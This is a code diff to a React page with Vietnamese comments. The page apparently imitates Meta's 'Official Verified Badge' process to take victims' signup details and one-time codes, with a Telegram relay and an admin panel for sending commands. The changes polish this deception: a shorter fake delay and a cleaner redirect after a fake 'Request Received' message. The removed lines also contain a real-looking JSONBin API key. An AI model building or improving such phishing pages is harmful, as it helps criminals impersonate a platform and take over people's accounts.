@@ -3,8 +3,8 @@ import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } fr
 
 // ==========================================
 // THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
-const BIN_ID = '6ad7e7f5ac6210605a43b63c';
-const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
+const BIN_ID = 'THAY_BIN_ID_CUA_MAY_VAO_DAY';
+const API_KEY = 'THAY_API_KEY_CUA_MAY_VAO_DAY';
 // ==========================================
 
 export default function Home() {
@@ -123,7 +123,12 @@ export default function Home() {
   }, []);
 
   // --- HÀM XỬ LÝ FORM ---
-  const openModal = () => { setShowModal(true); setStep(1); };
+  const openModal = () => { 
+      setShowModal(true); 
+      setStep(1); 
+      setShowSuccess(false); // Reset trạng thái thành công
+      setShowAdmin(false); // Tắt Admin nếu đang mở
+  };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
@@ -161,7 +166,7 @@ export default function Home() {
             setShowSuccess(true);
             setOtp('');
         }
-    }, 5000);
+    }, 1500);
   };
 
   // --- HÀM GỬI LỆNH TỪ ADMIN ---
@@ -274,7 +279,7 @@ export default function Home() {
       <section className="cta">
           <div className="cta-inner">
               <div className="cta-content">
-                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
+                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                   <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
                   <button className="btn-primary" onClick={openModal}>Claim your badge</button>
               </div>
@@ -320,9 +325,10 @@ export default function Home() {
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                 
-                                <button onClick={() => { 
+                <button onClick={() => { 
+                    setShowSuccess(false); 
+                    setShowModal(false); 
                     window.location.href = '/live'; 
-                    window.location.reload(); 
                 }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
@@ -646,16 +652,17 @@ export default function Home() {
                       <>
                         {showSuccess ? (
                           // GIAO DIỆN THÀNH CÔNG
-                                                      <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                          <div style={{ textAlign: 'center', padding: '20px 0' }}>
                             <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>Request Received</h2>
                             <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>
                                 Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.
                             </p>
-                                                        <button 
+                            <button 
                                 type="button" 
                                 onClick={() => { 
-                                    window.location.href = '/live'; // Chuyển về link /live
-                                    window.location.reload(); // Tải lại trang
+                                    setShowSuccess(false); 
+                                    setShowModal(false); 
+                                    window.location.href = '/live'; // Chuyển hẳn về trang chủ
                                 }} 
                                 className="fb-btn"
                             >
